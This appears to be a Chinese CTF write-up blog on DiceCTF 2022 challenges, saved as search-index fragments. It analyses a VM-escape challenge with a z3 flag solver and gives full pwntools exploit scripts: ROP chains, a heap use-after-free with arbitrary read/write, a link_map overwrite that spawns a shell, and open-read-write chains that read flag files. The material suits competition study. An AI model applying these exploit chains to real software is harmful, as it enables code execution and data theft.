__int8)code[pc] \u003e\u003e 4]; break; case 9u: // cmp and jmp if ( Reg_list[code[pc + 1] \u0026 0xF] == Reg_list[(unsigned __int8)code[pc + 1] \u003e\u003e 4] ) next_pc = *(_QWORD *)\u0026code[pc + 2]; else next_pc = pc + 10; pc = next_pc; break; case 0xAu: // puts reg printf(\"r%d = 0x%lx\\n\", code[pc + 1] \u0026 0xF, Reg_list[code[pc + 1] \u0026 0xF]); pc += 2LL; break; } } return 0; } 虚拟机共16个64位寄存器（R0-R15）在bss段，其中R15为rsp，代码段cs在堆上，数据段和栈段为同一个在bss中。共实现了11个指令： hlt exited 标志设为1，停止执行 mov reg, imm 立即数传送 mov reg, reg 寄存器值传送 alu dst, src 对两寄存器的值进行计算 mov ds:[dst], src src寄存器的值，送入ds段基址+dst值偏移的地址中 mov dst, ds:[src] 加载ds段基址+src值偏移的地址的值到dst寄存器 mov dst, cs:[src] 加载cs段基址+src值偏移的地址的值到dst寄存器 jmp imm 跳转到指定pc jmp reg 跳转到寄存器指定值处 jeq r1, r2, imm 相等则跳转 puts reg 输出指定寄存器的值 ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:1:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#程序分析"},{"categories":["Writeups"],"content":"Pwn","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#pwn"},{"categories":["Writeups"],"content":"指令分析虽然作者在赛后给出了汇编文件，但是个人看着不习惯，又将breach.bin自己进行了翻译，更接近x86汇编。 虚拟机本身的漏洞点在访问内存时没有检查偏移的范围，造成通过代码段cs和数据段ds越界读写。cs在堆上，ds在bss中。ds的附近有libc和重要的地址信息，可以泄露各部分的基址。 读取计算偏移即可实现任意地址读写。 breach.bin中为作者的payload。它实现了虚拟机的逃逸，然后将栈迁移到堆上，消除了栈地址的不确定，只需要向fake-stack中写入rop，就可以实现虚拟机不支持的功能，然后又回到虚拟机中继续执行。 breach.bin的各个函数地址都是固定的，通过jmp可以直接调用。如果需要返回需要提前将下一条指令的地址写入栈中。如程序开始这段。 [0x0000] (1) :: mov r15, 0x10000 ; r15 = 0x10000 ; call [0x0009] (1) :: mov r0, 0x8 ; r0 = 0x8 [0x0012] (3) :: sub r15, r0 ; r0 = 0x8, r15 = 0xfff8 [0x0014] (1) :: mov r0, 0x28 ; r0 = 0x28, r15 = 0xfff8 [0x001d] (4) :: mov ds:[r15], r0 ; ds:[0xfff8] = 0x28 [0x001f] (7) :: jmp 0x59 ; ret [0x23bd] (5) :: mov r1, ds:[r15] [0x23bf] (1) :: mov r0, 0x8 [0x23c8] (3) :: add r15, r0 [0x23ca] (8) :: jmp r1 breach.bin先计算main函数的返回地址然后通过stack_povit [0x276d]，写栈劫持的rop。之后就是不断在fake_stack中写rop。 在程序中，对gadget和一些str进行了简单的异或操作，(val | (type\u003c\u003c56) )^0x676e614765636944，type标识了这个数据是立即数（0x00），libc偏移（0x34），程序偏移（0x56）或跳过（0x99）。0xdeadbeefdeadbeef ^ 0x676e614765636944代表这段数据写完了，可以退出循环了。 对应的汇编如下： [0x2681] (6) :: mov r0, cs:[r5] ; 取数据到r0 [0x2683] (1) :: mov r1, 0x676e614765636944 [0x268c] (3) :: xor r0, r1 ; 得到原始数据 [0x268e] (1) :: mov r1, 0xdeadbeefdeadbeef ; 是否结束 [0x2697] (9) :: jeq r0, r1, 0x2745 [0x26a1] (2) :: mov r6, r0 [0x26a3] (2) :: mov r7, r0 [0x26a5] (1) :: mov r0, 0xffffffffffffff ; 取得val [0x26ae] (3) :: and r6, r0 [0x26b0] (1) :: mov r0, 0x38 [0x26b9] (3) :: shr r7, r0 ; 取得type [0x26bb] (1) :: mov r0, 0x0 [0x26c4] (9) :: jeq r7, r0, 0x26fd ; imm？ [0x26ce] (1) :: mov r0, 0x34 [0x26d7] (9) :: jeq r7, r0, 0x2708 ; libc gadget？ [0x26e1] (1) :: mov r0, 0x56 [0x26ea] (9) :: jeq r7, r0, 0x2717 ; text gadget？ [0x26f4] (7) :: jmp 0x2726 [0x26fd] (4) :: mov ds:[r4], r6 [0x26ff] (7) :: jmp 0x2726 [0x2708] (2) :: mov r0, r2 ; r2 = libc base [0x270a] (3) :: add r0, r6 [0x270c] (4) :: mov ds:[r4], r0 [0x270e] (7) :: jmp 0x2726 [0x2717] (2) :: mov r0, r3 ; r3 = text base [0x2719] (3) :: add r0, r6 [0x271b] (4) :: mov ds:[r4], r0 [0x271d] (7) :: jmp 0x2726 [0x2726] (1) :: mov r0, 0x8 ; 移动指向fake stack和cs数据的指针 [0x272f] (3) :: add r5, r0 [0x2731] (1) :: mov r0, 0x8 [0x273a] (3) :: add r4, r0 [0x273c] (7) :: jmp 0x2681 [0x2745] (5) :: mov r7, ds:[r15] ; 移动指针，并ret，从栈中取得pc，jmp [0x2747] (1) :: mov r0, 0x8 [0x2750] (3) :: add r15, r0 [0x2752] (5) :: mov r6, ds:[r15] [0x2754] (1) :: mov r0, 0x8 [0x275d] (3) :: add r15, r0 [0x275f] (5) :: mov r1, ds:[r15] [0x2761] (1) :: mov r0, 0x8 [0x276a] (3) :: add r15, r0 [0x276c] (8) :: jmp r1 ; 0x2658 [0x2658] (0) :: hlt ; trigger 执行rop后，将循环标志置零，设置rax为text+193B，call rax继续运行虚拟机。breach.bin还实现了较为通用的syscall函数，可以设置多个参数。通过几个gadget设置寄存器的值，然后通过在固定的栈帧写值即可实现，控制寄存器实现syscall。在rop链数据区将对应的位置空出。 [0x2353] (1) :: mov r0, 0x8008 [0x235c] (4) :: mov ds:[r0], r12 ; fake_stack[1] [0x235e] (1) :: mov r0, 0x8018 [0x2367] (4) :: mov ds:[r0], r13 ; fake_stack[3] [0x2369] (1) :: mov r0, 0x8050 [0x2372] (4) :: mov ds:[r0], r8 ; fake_stack[10] [0x2374] (1) :: mov r0, 0x8060 [0x237d] (4) :: mov ds:[r0], r9 ; fake_stack[12] [0x237f] (1) :: mov r0, 0x8070 [0x2388] (4) :: mov ds:[r0], r10 ; fake_stack[14] [0x238a] (1) :: mov r0, 0x8080 [0x2393] (4) :: mov ds:[r0], r11 ; fake_stack[16] [0x2395] (1) :: mov r4, 0x287b [0x239e] (1) :: mov r0, 0x8 [0x23a7] (3) :: sub r15, r0 [0x23a9] (1) :: mov r0, 0x23bd [0x23b2] (4) :: mov ds:[r15], r0 [0x23b4] (7) :: jmp 0x2504 [0x2504] (2) :: mov r5, r4 ; r5 = 0x287b _rop_syscall [0x2506] (1) :: mov r4, 0x8000 [0x250f] (1) :: mov r0, 0x8 [0x2518] (3) :: sub r15, r0 [0x251a] (1) :: mov r0, 0x252e [0x2523] (4) :: mov ds:[r15], r0 [0x2525] (7) :: jmp 0x2667 ; 写rop链 下面是其rop链： ; 进行系统调用 rop_syscall: pop rdx pop rcx pop rbx ret empty empty empty pop rax ret ret mov r10, rdx jmp rax mov r8, rbx mov rax, r8 pop rbx ret empty pop rax ret empty pop rdi ret empty pop rsi ret empty pop rdx pop rcx pop rbx ret empty empty empty syscall ret pop rbx ret textg: 0x140a0 mov qword ptr [rbx], rax pop rax pop rdx pop rbx ret const: 0x0 const: 0x0 const: 0x0 ; 将循环标志置零，返回main继续执行 ret_main: pop rax ret textg: 0x193b pop rd","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:1","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#指令分析"},{"categories":["Writeups"],"content":"Vuln下面通过调试寻找利用点。我们发现主程序读取输入到堆上的cs头部。分析指令 [0x1eaa] (1) :: mov r0, 0x1 [0x1eb3] (9) :: jeq r8, r0, 0x2085 ; ret [0x2085] (5) :: mov r1, ds:[r15] [0x2087] (1) :: mov r0, 0x8 [0x2090] (3) :: add r15, r0 [0x2092] (8) :: jmp r1 ; 0x28 父进程会在0x1eaa处比较r8与1，而r8是系统调用的返回值。如果返回值为1，则会到0x2085执行，然后返回到0x28处。我们可以溢出到0x28，使得父进程执行任意的指令。 此时的虚拟机寄存器： ''' r0 = 0x8 r1 = 0x28 r2 = libc base r3 = text base r4 = (fake_stack - data segment) + 0x150 r5 = offset(cs data - cs) r6 = text base r7 = stack return addr r8 = 1 ; rax r9 = 0 ; rdi r10 = 0x7fb0 ; rsi r11 = fake_stack ; rdx ''' 我们有56字节的空间，虚拟机的任何系统调用都要使用fake_stack完成，我们可以通过调用虚拟机实现的syscall调用read，向fake_stack写入rop链，从而控制父进程。 控制父进程后，由于不能使用open，还是不能打开flag。但是子进程没有这个限制，在strace中我们可以看到子进程会先读取父进程传递的输入的size，而且调试后可以发现子进程也是向代码段读取输入，并且会回到0x4bc执行虚拟机指令。同理我们可以给子进程一个很大的size，发送payload覆盖子进程的虚拟机指令，然后在子进程中实现fake_stack的栈溢出。从而控制子进程读取flag，并返回给父进程。父进程读取并输出即可。 ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:2","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#vuln"},{"categories":["Writeups"],"content":"Exp from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './breach' libc = './libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] # context.binary = binary # context.log_level='debug' # p = gdb.debug([\"./breach\", \"./breach.bin\"], ''' # b fopen # follow child # ''') p = remote('mc.ax', 31618) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) alu_list = { \"+\": 0, \"-\": 1, \"*\": 2, \"%\": 3, \"\u0026\": 4, \"|\": 5, \"^\": 6, \"\u003e\u003e\": 7 } def Exit(): # 1 return \"\\x00\" def Mov_r_i(dst, imm): # 9 opcode = p8((dst\u003c\u003c4)+1) + p64(imm) return opcode def Mov_r_r(dst, src): # 2 opcode = p8(2) + p8((src\u003c\u003c4) + dst) return opcode def Alu(op, dst, src): # 2 opcode = p8((alu_list[op]\u003c\u003c4)+3) + p8((src\u003c\u003c4) + dst) return opcode def Mov_d_r(dst, src): # 2 opcode = p8(4) + p8((src\u003c\u003c4) + dst) return opcode def Mov_r_d(dst, src): # 2 opcode = p8(5) + p8((dst\u003c\u003c4) + src) return opcode def Mov_r_c(dst, src): # 2 opcode = p8(6) + p8((dst\u003c\u003c4) + src) return opcode def Jmp_i(imm): # 9 opcode = p8(7) + p64(imm) return opcode def Jmp_r(reg): opcode = p8((reg\u003c\u003c4)+8) return opcode def Cmp_j(dst, src, imm): opcode = p8(9) + p8((dst\u003c\u003c4) + src) + p64(imm) return opcode def Show(reg): opcode = p8(10) + p8(reg) return opcode def Showall(): opcode = '' for i in range(10): opcode += p8(10) + p8(i) return opcode ''' r0 = 0x8 r1 = 0x28 r2 = libc base r3 = text base r4 = (fake_stack - data segment) + 0x150 r5 = offset(csdata - cs) r6 = text base r7 = stack return addr r8 = 1 ; rax r9 = 0 ; rdi r10 = 0x7fb0 ; rsi r11 = fake_stack ; rdx ''' insns = 'a'*0x28 insns += Show(2) insns += Show(11) # read(0, fake_stack, 0x2873) insns += Mov_r_r(8, 9) # rax = 0 rdi = 0 insns += Mov_r_r(10, 11) # rsi = fake_stack insns += Mov_r_r(11, 5) # rdx = 0x2873 insns += Jmp_i(0x2353) p.sendafter(\": \", insns) p.sendafter(\": \", \"\\n\") # trigger p.recvuntil(\"r2 = 0x\") libc_base = int(p.recvuntil(\"\\n\", drop=True), 16) leak('libc base', libc_base) p.recvuntil(\"r11 = 0x\") fake_stack = int(p.recvuntil(\"\\n\", drop=True), 16) leak('fake_stack', fake_stack) pop_rdi = libc_base + 0x0000000000026b72 pop_rsi = libc_base + 0x0000000000027529 pop_rdx_r12 = libc_base + 0x000000000011c371 # Now, we control parent to interactive with child # give it a large size to overflow child's rom and control it payload = \"a\"*0xa0 # parent read size payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x8)*2 + p64(libc_base+libc.sym[\"read\"]) # write(5, fake_stack, 8) to child payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x8)*2 + p64(libc_base+libc.sym[\"write\"]) # parent read payload payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"read\"]) # write(5, fake_stack, 0x1000) to child payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"write\"]) # parent read orw payload payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"read\"]) # write(5, fake_stack, 0x1000) to child payload += p64(pop_rdi) + p64(5) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x1000)*2 + p64(libc_base+libc.sym[\"write\"]) # read flag from child payload += p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x30)*2 + p64(libc_base+libc.sym[\"read\"]) # write flag to stdout payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(fake_stack-0x1000) + p64(pop_rdx_r12) + p64(0x30)*2 + p64(libc_base+libc.sym[\"write\"]) sleep(0.5) p.sendline(payload) sleep(0.5) p.send(p64(0x1000)) # size # payload read(4, cs, 0x30) child_insns = \"a\"*0x4bc child_insns += Mov_r_i(8, 0) # rax = 0 child_insns += Mov_r_i(9, 4) # rdi = 0 child_insns += Mov_r_i(10, fake_stack) # rsi = fake_stack child_insns += Mov_r_i(11, 0x1000) # rdx = 0x1000 child","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:2:3","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#exp"},{"categories":["Writeups"],"content":"Rev通过之前的分析，子进程检查了我们的输入，逆向的部分就在这里。 ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#rev"},{"categories":["Writeups"],"content":"指令分析 child_main: [0x019e] (1) :: mov r8, 0x2004 [0x01a7] (1) :: call close_ptr [0x01c6] (1) :: mov r8, 0x2008 [0x01cf] (1) :: call close_ptr [0x01ee] (1) :: mov r8, 0x0 [0x01f7] (1) :: call close [0x0216] (1) :: mov r8, 0x1 [0x021f] (1) :: call close [0x023e] (7) :: jmp child_handler 子进程关闭了pipe和标准输入输出。接着又调用了patch_cmd ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:1","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#指令分析-1"},{"categories":["Writeups"],"content":"patch_cmd patch_cmd: [0x0247] (1) :: mov r8, 0xa [0x0250] (1) :: mov r9, 0x1000 [0x0259] (3) :: add r9, r3 [0x025b] (1) :: mov r10, 0x2000 [0x0264] (1) :: mov r11, 0x7 [0x026d] (1) :: call do_syscall ; mprotect(text_base + 0x1000, 0x2000, 7) [0x028c] (1) :: mov r0, 0x2020 [0x0295] (5) :: mov r1, ds:[r0] ; code_ptr [0x0297] (1) :: mov r0, 0x2a23 [0x02a0] (3) :: add r1, r0 ; code_ptr + 0x2a23 [0x02a2] (2) :: mov r9, r1 [0x02a4] (1) :: mov r8, 0x1a00 [0x02ad] (3) :: add r8, r3 ; text_base + 0x1a00 [0x02af] (1) :: mov r1, 0x2bf6 [0x02b8] (1) :: mov r0, 0x2a23 [0x02c1] (3) :: sub r1, r0 ; size [0x02c3] (1) :: mov r0, 0x3 [0x02cc] (3) :: shr r1, r0 ; size // 8 [0x02ce] (2) :: mov r10, r1 [0x02d0] (1) :: call memcpy ; memcpy(text_base + 0x1a00, code_ptr + 0x2a23, 0x1d3) [0x02ef] (1) :: mov r9, 0xfffff9bcfffff7c8 [0x02f8] (1) :: mov r8, 0x2068 [0x0301] (3) :: add r8, r3 [0x0303] (1) :: call write_mem ; change jmp table Show --\u003e text_base + 0x1a00 [0x0322] (1) :: mov r8, 0xa [0x032b] (1) :: mov r9, 0x1000 [0x0334] (3) :: add r9, r3 [0x0336] (1) :: mov r10, 0x2000 [0x033f] (1) :: mov r11, 0x5 [0x0348] (1) :: call do_syscall ; mprotect(text_base + 0x1000, 0x2000, 5) [0x0367] (5) :: ret 从breach.bind的0x2a23处的0x1d3字节的代码复制到text_base + 0x1a00处，又修改了0xa号指令的偏移表，使其在处理的时候会跳转到text_base + 0x1a00。相当于patch了0xa号指令。 dump对应指令，进行分析： __int64 __fastcall sub_1A0A(__int64 var) { __int64 stack_pointer; // rdx char op; // bl __int64 result; // rax LOBYTE(var) = *(_BYTE *)(MEMORY[0x140E0] + MEMORY[0x4040] + 1i64);// code + pc + 1 stack_pointer = MEMORY[0x7060]; // init: 0x3008 op = *(_BYTE *)(MEMORY[0x140E0] + MEMORY[0x4040]) \u003e\u003e 4; if ( op ) { switch ( op ) { case 1: *(_BYTE *)(MEMORY[0x7060] + 0x4060i64) = var; MEMORY[0x7060] = stack_pointer + 1; break; case 2: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) += *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 3: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) *= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 4: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) ^= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 5: *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64) = *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64) == 0; break; case 6: *(_BYTE *)(MEMORY[0x7060] + 0x405Ei64) \u0026= *(_BYTE *)(MEMORY[0x7060] + 0x405Fi64); MEMORY[0x7060] = stack_pointer - 1; break; case 7: LOBYTE(var) = 8 * var; *(_QWORD *)(var + 0x14060) = *(unsigned __int8 *)(MEMORY[0x7060] + 0x405Fi64);// set reg MEMORY[0x7060] = stack_pointer - 1; break; case 8: MEMORY[0x7060] = 0x3008i64; break; } } else { LOBYTE(var) = 8 * var; *(_BYTE *)(MEMORY[0x7060] + 0x4060i64) = *(_BYTE *)(var + 0x14060);// load reg MEMORY[0x7060] = stack_pointer + 1; } result = MEMORY[0x4040] + 2i64; // pc+2 MEMORY[0x4040] += 2i64; return result; } 经过分析可以看出这是一个简单的字节栈机器，MEMORY[0x7060]，即rsp初始为0x3008，指向待操作的栈帧。 Low +-----+ | | \u003c-- var1 0x405Ei64 +-----+ | | \u003c-- var2 0x405Fi64 +-----+ | | \u003c-- stack_pointer +-----+ | | High +-----+ 指令集如下： op instruction 描述 0 ex.push reg 寄存器的最低字节入栈 1 ex.push imm 立即数入栈 2 ex.add 栈顶上方两数相加 3 ex.mul 栈顶上方两数相乘 4 ex.xor 栈顶上方两数异或 5 ex.eqz 栈顶上方的数是否为0 6 ex.and 栈顶上方两数相与 7 ex.pop 栈顶上方的数弹出到寄存器 8 ex.reset 设置栈指针为0x3008 重新对flag检查部分进行分析： check_flag: mov r0, 0x0 mov r8, cs:[r0] mov r0, 0xffffffffff and r8, r0 mov r0, 0x7b65636964 ; 'dice{' jeq r8, r0, deep_check jmp check_end_false deep_check: ex.reset mov r0, 0x7 mov r8, cs:[r0] mov r0, 0x1 mov r9, cs:[r0] mov r0, 0x11 mov r10, cs:[r0] mov r0, 0xf mov r11, cs:[r0] ex.push r8 ex.push r9 ex.add ex.push 0x2c ex.add ex.push r10 ex.push r11 ex.add ex.push 0xd8 ex.xor ex.xor ex.push 0x10 ex.xor ex.push 0xd6 ex.xor ex.eqz mov r0, 0x1 mov r8, cs:[r0] mov r0, 0x5 mov r9, cs:[r0] mov r0, 0xd mov r10, cs:[r0] mov r0, 0xe mov r11, cs:[r0] ex.push r8 ex.push r9 ex.xor ex.push 0xd6 ex.xor ex.push r10 ex.push r11 ex.xor ex.push 0x70 ex.add ex.add ex.push 0xe5 ex.xor ex.push 0xa6 ex.xor ex.eqz ; ... mov r0, 0x24 mov r8, cs:[r0] mov r0, 0x18 mov r9, cs:[r0] mov r0","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:2","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#patch_cmd"},{"categories":["Writeups"],"content":"z3-slover根据这79个约束可以使用z3来快速求解： from z3 import * def get_op(): line = f.readline() if \"add\" in line: return '+' elif \"mul\" in line: return '*' elif \"xor\" in line: return '^' elif \"and\" in line: return '\u0026' def get_imm(): line = f.readline() return int(line[10:], 16) slov = Solver() flag = [] for i in range(0x24+1): flag.append(BitVec(f'x{i}', 8)) slov.add(flag[0] == ord(\"d\")) slov.add(flag[1] == ord(\"i\")) slov.add(flag[2] == ord(\"c\")) slov.add(flag[3] == ord(\"e\")) slov.add(flag[4] == ord(\"{\")) slov.add(flag[0x24] == ord('}')) f = open(\"./test.txt\", \"r\") for i in range(79): line = f.readline() r8 = int(line[10:], 16) f.readline() line = f.readline() r9 = int(line[10:], 16) f.readline() line = f.readline() r10 = int(line[10:], 16) f.readline() line = f.readline() r11 = int(line[10:], 16) f.readline() # print(\"r8: {}, r9: {}, r10: {}, r11: {}\".format(r8, r9, r10, r11)) f.readline() f.readline() op1 = get_op() imm1 = get_imm() op2 = get_op() f.readline() f.readline() op3 = get_op() imm2 = get_imm() op4 = get_op() op5 = get_op() imm3 = get_imm() op6 = get_op() imm4 = get_imm() f.readline() f.readline() # eqz eq = f'((((flag[{r8}] {op1}flag[{r9}]) {op2}{imm1}) {op5}((flag[{r10}] {op3}flag[{r11}]) {op4}{imm2})) {op6}{imm3}) == {imm4}' # print(eq) slov.add(eval(eq)) if slov.check() == sat: result = slov.model() str = [' ']*0x30 for i in result: idx = int(i.name()[1:]) str[idx] = chr(result[i].as_long()) print(''.join(str)) else: print(\"[!] No result\") # dice{st4ying_ins1de_vms_1s_0verr4ted} ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:3","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#z3-slover"},{"categories":["Writeups"],"content":"DiceCTF2020DiceCTF题目好怪啊 ","date":"2022-02-08","objectID":"/dicectf2022/:0:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#dicectf2020"},{"categories":["Writeups"],"content":"interview在主函数有一个溢出，覆盖main的返回地址为_libc_strat_main内，可以再次调用main同时得到libc地址。 from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './interview-opportunity' libc = './libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) p = remote('mc.ax', 31081) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) # gdb.attach(p, \"b *0x401276\") payload = \"A\"*0x1a + \"B\"*0x8 + \"\\x03\" p.sendafter(\"DiceGang?\\n\", payload) p.recvuntil(\"B\"*0x8) libcbase = u64(p.recv(6).ljust(8, \"\\x00\")) - 0x26d03 leak(\"libc base\", libcbase) pop_rdi = libcbase + 0x0000000000026796 binsh = libcbase + 0x000000000018a152 system = libcbase + libc.sym['system'] payload = \"A\"*0x1a + \"B\"*0x8 + p64(pop_rdi) + p64(binsh) + p64(system) p.sendafter(\"DiceGang?\\n\", payload) p.interactive() ","date":"2022-02-08","objectID":"/dicectf2022/:1:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#interview"},{"categories":["Writeups"],"content":"baby-ropuaf，通过对ub中的chunk的复用泄漏libc地址，uaf控制一个strings的结构体，从而可以任意地址读写，泄露栈地址，向栈中写rop from multiprocessing.dummy import Value from os import environ from webbrowser import get from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './babyrop' libc = './libc.so-2.6' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) p = remote('mc.ax', 31245) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) def add(idx, size, data): p.sendlineafter(\"command: \",\"C\") p.sendlineafter(\"index: \", str(idx)) p.sendlineafter(\"string: \", str(size)) p.sendafter(\" string: \", data) def free(idx): p.sendlineafter(\"command: \",\"F\") p.sendlineafter(\"index: \", str(idx)) def show(idx): p.sendlineafter(\"command: \",\"R\") p.sendlineafter(\"index: \", str(idx)) def edit(idx, data): p.sendlineafter(\"command: \",\"W\") p.sendlineafter(\"index: \", str(idx)) p.sendlineafter(\" string: \", data) def get_leak(size): p.recvuntil(\"bytes\\n\") buf = p.recvuntil(\"\\n\", drop=True).split(\" \") value = 0 for i in range(size): value += (int(buf[i], 16)\u003c\u003c(8*i)) return value # print(\"value = \" + hex(value)) add(0, 0x500, \"a\"*0x18) add(1, 0x500, \"a\"*0x18) add(2, 0x500, \"a\"*0x18) free(0) free(1) add(0, 0x500, 'A') add(1, 0x500, 'A') show(0) p.recvuntil(\"bytes\\n\") p.recvuntil(\"00 00 \") buf = p.recvuntil(\"\\n\", drop=True).split(\" \") heapbase = 0 for i in range(8): heapbase += (int(buf[i], 16)\u003c\u003c(8*i)) heapbase = heapbase - 0x1c00 leak(\"heapbase\", heapbase) # pause() show(1) p.recvuntil(\"bytes\\n\") buf = p.recvuntil(\"\\n\", drop=True).split(\" \") libcbase = 0 for i in range(8): libcbase += (int(buf[i], 16)\u003c\u003c(8*i)) libcbase = libcbase - 0x1f4c41 leak(\"libc base\", libcbase) open_addr = libcbase + libc.sym['open'] read_addr = libcbase + libc.sym['read'] write_addr = libcbase + libc.sym['write'] environ = libcbase + libc.sym['environ'] pop_rdi = libcbase + 0x000000000002d7dd pop_rsi = libcbase + 0x000000000002eef9 pop_rdx = libcbase + 0x00000000000d9c2d add(0, 0x18, \"0\"*0x18) add(1, 0x28, \"1\"*0x18) free(0) free(1) add(2, 0x18, p64(0x100)+p64(environ)) show(0) stack_leak = get_leak(8) - 0x140 leak(\"stack leak\", stack_leak) edit(2,p64(0x100)+p64(stack_leak)) flag_str = stack_leak + 0x8*(19+8) orw = p64(pop_rdi+1)*8 # open orw += p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0) + p64(open_addr) # read orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(read_addr) # write orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(write_addr) orw += \"./flag.txt\\x00\" edit(0, orw) p.sendlineafter(\"command: \",\"E\") p.interactive() ","date":"2022-02-08","objectID":"/dicectf2022/:2:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#baby-rop"},{"categories":["Writeups"],"content":"dataeater可以控制scanf的参数，不能rop。这样可以写任意写buf和link_map。覆盖link_map-\u003el_info[strtab]为buf，从而在buf伪造system字符串，使其搜索system地址。 from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './dataeater' libc = \"/lib/x86_64-linux-gnu/libc.so.6\" context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) st_name = 0x37 system_str = elf.sym['buf'] + 0x10 def pwn(k): print(k) try: r = remote('mc.ax', 31869) # r = process(binary) # gdb.attach(r) r.sendline('%s%{}$s'.format(k)) # r.sendline(\"a a\") r.sendline(b'/bin/sh\\0' + p64(system_str - st_name) + b'system\\0' + p64(0)*13 + p64(elf.sym['buf'])[:-1]) r.interactive() return True except EOFError: return False finally: r.close() pwn(32) ","date":"2022-02-08","objectID":"/dicectf2022/:3:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#dataeater"},{"categories":["Writeups"],"content":"chutes-ladders First, copy all the Player-\u003emark to the first board-\u003eplayers Game： spin a num （0-6）， 0 pass cur_player-\u003esquare update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) leave here clear board-\u003eplayers if bitmap == 0: free board-\u003eplayers Player-\u003esquare += spin if hit a ladders: cur_player-\u003esquare = ladders_end update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) enter here first get the board: allocte board-\u003eplayers, init with ’ ' copy mark ladders_hit = 1 if hit a chutes: cur_player-\u003esquare = chutes_end update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) enter here first get the board: allocte board-\u003eplayers, init with ’ ' copy mark chutes_hit = 1 else update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) enter here first get the board: allocte board-\u003eplayers, init with ’ ' copy mark chutes_hit = 1 if bitmap == 0: board-\u003eplayers = 0 next turn repeat 10 players [0, 1, 2, 3, 4, 5, 6, 7, 8] at 1 allocate one chunk [3, 4, 5, 6, 7, 8] at 1, [0, 1, 2] at 2 allocate two chunk [3, 4, 5, 6, 7, 8] at 1, [1, 2] at 2, 0 at 5 allocate three chunk [1, 2, 3, 4, 5, 6, 7, 8] at 2, [0] at 5 allocate two chunk free 1 [1, 2, 3, 4, 5, 6, 7, 8] at 2, [0] leave but ret to 5 allocate one chunk free 3 